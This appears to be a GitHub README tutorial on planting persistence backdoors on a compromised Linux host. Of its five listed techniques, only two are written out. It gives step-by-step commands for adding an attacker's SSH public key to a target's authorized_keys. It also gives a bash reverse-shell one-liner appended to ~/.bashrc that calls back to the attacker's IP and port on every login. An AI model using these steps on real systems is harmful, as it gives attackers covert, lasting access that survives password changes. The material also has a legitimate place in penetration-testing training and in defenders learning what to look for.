# backdoors

1.ssh\
2.bashrc\
3.suid\
4.cron\
5.php

# //------------------------------------
# 1. SSH Key Access
SSH keys provide extreme convenience for system administrators, however, they also provide convenient backdoors for attackers. Start on your host by generating an SSH key with the command:
\
ssh-keygen\
\
![image](https://raw.githubusercontent.com/DDNvR/backdoors/main/images/sshkeygen.png)
\
This should generate two files an id_rsa.pub which is your public key, and id_rsa which is your private key.\
\
Now that the keys are generated switch back over to the target box and cd to your user's respective home directory (cd ~). As you can see in the image below there was no .ssh directory or authorized_keys file. This is no issue as you can create them with the commands:\
\
mkdir .ssh\
touch authorized_keys

![image](https://github.com/DDNvR/backdoors/blob/main/images/authorizedkeys.png)

\
With that taken care of, back on your attacker box, cat you id_rsa.pub (the public key and copy the entire output.

![image](https://github.com/DDNvR/backdoors/blob/main/images/keyshow.png)

\
All that is left to do is to echo the output of your id_rsa.pub into the authorized_keys file on the target box. I always like to double-check key was formatted properly by taking a look at the authorized_keys file. Alternatively to echoing the contents of your public key to the authorized_keys file, if you have ssh access to the target box you can utilize the text editor of your choice and copy + paste the contents.

![image](https://github.com/DDNvR/backdoors/blob/main/images/addkey.png)

\
Now to utilize the backdoor all you have to do is ssh to the target box and no matter what they change their password to you will always have key access to the host.\
\
Note: make sure to use -i [private key file] in your ssh command to specify you want to make use of key authentication.\

# //------------------------------------
# Bashrc Backdoor
The .bashrc file, located in every user's home directory is rarely checked by the average user, making this one of my favorite spots to stick a backdoor.\
\
Ensure you are in your user’s home directory by issuing the command:\
\
cd ~\
\
Now that you are in their home directory simply echo the following and direct the output to append(not overwrite the .bashrc file):\
\
echo ‘bash -i >& /dev/tcp/[attack box ip address]/[port] 0>&1’ >> ~/.bashrc\
\
Confirm the aforementioned command completed successfully my examining the end of the .bashrc file with:\
\
tail ~/.bashrc\
\
With that established, all that is left to do is set up a listener. Now every time that user logs in to the box it will call out to your attack box on the specified port number! To simulate this in a lab environment simply exit the ssh session and re-login with the key persistence we set up earlier. This login will trigger the reverse shell to call out.\
imagehere\

# //------------------------------------


